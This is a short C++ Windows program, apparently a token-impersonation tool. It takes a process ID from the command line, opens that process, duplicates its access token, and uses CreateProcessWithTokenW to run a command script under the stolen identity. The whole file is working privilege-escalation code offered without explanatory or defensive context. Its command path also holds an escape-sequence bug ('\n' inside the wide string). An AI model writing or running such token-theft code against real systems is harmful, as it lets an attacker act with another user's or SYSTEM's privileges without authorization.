#include "stdafx.h"
#include <windows.h>
#include <iostream>

int main(int argc, char * argv[]) {
	char a;
	HANDLE processHandle;
	HANDLE tokenHandle = NULL;
	HANDLE duplicateTokenHandle = NULL;
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	printf("Enter PID: %i\n", atoi(argv[1]));
	DWORD PID_TO_IMPERSONATE = atoi(argv[1]);
	wchar_t cmdline[] = L"E:\nooranet.cmd";
	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(STARTUPINFO);	

	processHandle = OpenProcess(PROCESS_ALL_ACCESS, true, PID_TO_IMPERSONATE);
	OpenProcessToken(processHandle, TOKEN_ALL_ACCESS, &tokenHandle);
	DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);			
	CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, NULL, cmdline, 0, NULL, NULL, &startupInfo, &processInformation);
	
	std::cin >> a;
    return 0;
}